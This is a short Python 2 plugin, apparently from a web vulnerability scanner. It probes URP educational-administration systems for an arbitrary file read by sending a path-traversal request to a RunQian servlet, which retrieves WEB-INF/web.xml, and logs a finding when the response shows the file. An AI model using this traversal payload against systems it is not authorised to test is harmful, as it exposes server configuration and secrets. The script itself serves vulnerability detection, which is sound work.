#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s/" % (ob['scheme'],domain)
        url += "servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('zhjw')>=0 and content.find('Set Character Encoding')>=0:
            request = getRequest(url)
            response = getResponse(res)            
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:URP_ArbitraryFileReadScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:URP_ArbitraryFileReadScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
